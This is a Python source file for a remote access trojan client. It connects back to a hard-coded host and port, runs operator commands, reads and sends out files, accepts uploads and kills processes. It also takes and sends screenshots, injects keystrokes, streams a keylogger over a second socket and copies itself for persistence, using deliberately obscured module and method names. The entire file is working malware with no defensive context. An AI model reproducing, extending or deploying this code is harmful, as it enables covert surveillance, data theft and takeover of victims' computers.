import socket
import os
import subprocess
import time
from modules_ import subprocess_exec,concatenate
import datetime
from modules_.tar_put.dlc7A import As1d,Key 
import threading
from modules_ import LPTjSb54
import shutil
import sys

class Target:
    def __init__(self):
        self._path=os.getcwd()+"\\"+os.path.basename(__file__)
        self.HOST='192.168.0.158'
        self.PORT=9876
        self.cur_dir=os.getcwd()
        self.CON_KEY=True
        self.socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.CON_KEY_f=True
        self.sn = '_343FDSSDFF4fdsDJFN34KD___sdfsdas2344534_'
        self.CMD_LIST={
            'pwd':self.path_to_dir,
            'terminate':self.terminate,
            'tasklist':self.tasks,
            'ls':self.list_files,
            'kill':self.kill_proc,
            'cd':self.change_dir,
            'cat':self.cat,
            'download':self.download,
            'upload':self.upload,
            'dlc_on':self.exec_dlc_ls,
            'dlc_off':self.close_dlc,
            'KrQ1':self.krq1,
            'exec':self.default,
            'prs':self.fJr31,
            'cp':self.copy,
            'reg':self.Tw5DSs56_
        }
    def send_err(self,err):
        self.socket.send(f'[!] AN ERROR OCCURED:\n\n{err}'.encode('utf-8'))
    def send_err_p(self,err):
        self.socket.sendall(f'[!] AN ERROR OCCURED\n\n{err}'.encode('utf-8'))
        self.socket.send(b"<END>")
    def terminate(self):
        self.socket.close();self.CON_KEY=False;self.CON_KEY_f=False
    def get_time(self,file):
        return datetime.datetime.fromtimestamp(os.path.getctime(file)).strftime('%d-%m-%Y %H:%M')
    def Tw5DSs56_(self):
        try:
            self.cmd_list.append(self._path)
            out=subprocess_exec.execute(self.cmd_list)
            if(len(out)==1):self.socket.send(out[0].encode('utf-8'))
            else:self.send_err(out[0])
        except Exception as err:
            self.send_err(repr(err))
    def copy(self):
        if(len(self.cmd_list)>3):self.cmd_list=concatenate.conc_path(self.cmd_list,self.cmd_list[1])
        if(os.path.exists(self.cmd_list[2]) and os.path.isdir(self.cmd_list[2]) and not self.cmd_list[1] in os.listdir(self.cmd_list[2])):
            try:
                os.chdir(self.cmd_list[2])
                self._path=os.getcwd()+'\\'+self.cmd_list[1]
                shutil.copyfile(sys.executable,self._path)
                self.socket.send('1'.encode('utf-8'))
                os.chdir(self.cur_dir)
            except Exception as err:
                self.send_err(repr(err))
        else:
            self.send_err(f'DIRECTORY ERROR')
    def fJr31(self):
        try:
            if('-t' in self.cmd):
                time.sleep(int(self.cmd_list[self.cmd_list.index('-t')+1]))
                del self.cmd_list[self.cmd_list.index('-t'):]
            if('-h' in self.cmd):
                LPTjSb54.keyDown(self.cmd_list[2])
                LPTjSb54.press(self.cmd_list[3])
                LPTjSb54.keyUp(self.cmd_list[2])
            elif('-w' in self.cmd):
                LPTjSb54.typewrite(" ".join(self.cmd_list[2:]))
            elif('-p' in self.cmd):
                LPTjSb54.press(self.cmd_list[2])
            else:
                LPTjSb54.press(self.cmd_list[1])
            self.socket.send('1'.encode('utf-8'))
        except Exception as err:
            self.send_err(repr(err))
    def krq1(self):
        try:
            krq=LPTjSb54.screenshot()
            krq.save(f'{self.sn}.png')
            with open(f'{self.sn}.png','rb') as file:
                data=file.read()
                self.socket.sendall(data)
                self.socket.send(b"<END>")
            if os.path.exists(f'{self.sn}.png'):
                os.remove(f'{self.sn}.png')
            else:
                print("The file does not exist") 
        except Exception as err:
            self.send_err_p(repr(err))
    def dlc_pr(self,key):
        char=""
        try:
            char=key.char
        except AttributeError:
            if(key==Key.enter):
                char="\n"
            elif(key==Key.space):
                char=" "
            else:
                char=f" {key} "
        try:
            self.dlc_socket.send(char.encode('utf-8'))
        except ConnectionResetError:
            print('SERVER DOWN')
            self.as1d.stop()
    def dlc_ls(self):
        self.dlc_socket.connect((self.HOST,self.PORT-1))
        order=self.dlc_socket.recv(1024).decode('utf-8')
        with As1d(on_press=self.dlc_pr) as self.as1d:
            self.as1d.join() 
    def exec_dlc_ls(self):
        self.dlc_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.socket.send('1'.encode('utf-8'))
        dlc_thread=threading.Thread(target=self.dlc_ls,args=())
        dlc_thread.start()
    def close_dlc(self):
        self.dlc_socket.close()
        self.as1d.stop()
    def upload(self):
        try:
            with open(self.cmd_list[1],"wb") as file:
                self.socket.send("1".encode('utf-8'))
                br_bytes=b""
                while True:
                    data=self.socket.recv(1024)
                    br_bytes+=data
                    if(br_bytes[-5:]==b"<END>"):
                        break
                try:
                    file.write(br_bytes[:-5])
                    self.socket.send("{SUCCESSFUL}".encode('utf-8'))  
                except Exception as err:
                    self.send_err(repr(err))
        except Exception as err:
            self.send_err(repr(err))
    def download(self):
        if(len(self.cmd_list)>2):self.cmd_list=concatenate.conc_path(self.cmd_list,self.cmd_list[0])
        try:
            print(os.getcwd())
            print(self.cmd_list)
            with open(self.cmd_list[1],"rb") as file:
                data = file.read()
                self.socket.sendall(data)
                self.socket.send(b'<END>')
        except Exception as err:
            self.send_err_p(repr(err))
    def cat(self):
        if(len(self.cmd_list)>2):self.cmd_list=concatenate.conc_path(self.cmd_list,self.cmd_list[0])
        try:
            with open(self.cmd_list[1],"r",encoding='utf-8',errors="replace") as file:
                data = file.read()
                self.socket.sendall(data.encode('utf-8'))
                self.socket.send(b'<END>')
        except Exception as err:
            self.send_err_p(repr(err))
    def change_dir(self):
        self.cmd_list=concatenate.conc_path(self.cmd_list,self.cmd_list[0])
        try:
            os.chdir(self.cmd_list[1])
            self.cur_dir=os.getcwd()
            self.socket.send(self.cur_dir.encode('utf-8'))
        except Exception as err:
            self.send_err(repr(err))
    def kill_proc(self):
        if('--im' in self.cmd_list):
            self.cmd_list[1]="/IM"
        elif('--pid' in self.cmd_list):
            self.cmd_list[1]='/PID'
        self.cmd_list[0]='taskkill'
        self.cmd_list.append('/F')
        print(self.cmd_list)
        out=subprocess_exec.execute(self.cmd_list)
        if(len(out)==1):self.socket.send("{SUCCESS}".encode('utf-8'))
        elif(len(out)==2):self.socket.send(out[0].encode('utf-8'))
    def path_to_dir(self):
        try:
            self.socket.send(os.getcwd().encode('utf-8'))
        except Exception as err:
            self.send_err(repr(err))
    def tasks(self):
        out=subprocess_exec.execute(self.cmd_list)
        self.socket.sendall(out[0].encode('utf-8'))
        self.socket.send(b'<END>')
    def list_files(self):
        if(len(self.cmd_list)>2):
            self.cmd_list=concatenate.conc_path(self.cmd_list,self.cmd_list[0])
        if(len(self.cmd_list)>1):
            try:
                os.chdir(self.cmd_list[1])
            except Exception as err:
                self.send_err_p(repr(err))
                return False
        ls = os.listdir()
        out=""
        for i in ls:
            if(os.path.isfile(i)):
                out+=f"{self.get_time(i)}  <FILE>   {i}\n"
            elif(os.path.isdir(i)):
                out+=f"{self.get_time(i)}  <DIR>    {i}\n"
            else:
                out+=f"{self.get_time(i)}  <OTHER>  {i}\n"
        self.socket.sendall(out.encode('utf-8'))
        self.socket.send(b"<END>")
        os.chdir(self.cur_dir)
    def default(self):
        out=subprocess_exec.execute(self.cmd_list[1:])
        self.socket.sendall(out[0].encode('utf-8'))
        self.socket.send(b"<END>")
    def execute(self,command):
        if(len(self.cmd_list)>0):
            if(command in self.CMD_LIST):
                list(self.CMD_LIST.values())[list(self.CMD_LIST.keys()).index(command)]()
    def communication(self):
        while self.CON_KEY_f:
            try:
                self.socket.connect((self.HOST,self.PORT))
                self.socket.send('0'.encode('utf-8'))
                self.socket.recv(10)
                self.socket.send(self.cur_dir.encode('utf-8'))
                self.CON_KEY=True
            except ConnectionRefusedError as err:
                time.sleep(1)
            while self.CON_KEY:
                try:self.cmd=self.socket.recv(1024).decode('utf-8')
                except ConnectionResetError:self.socket.shutdown(socket.SHUT_RDWR);self.CON_KEY=False;self.socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM);break
                self.cmd_list=self.cmd.split()
                try:
                    self.execute(self.cmd_list[0])
                except IndexError as err:
                    time.sleep(0.5)
                    print(f"[!] {repr(err)}")

if(__name__=='__main__'):
    target=Target()
    target.communication()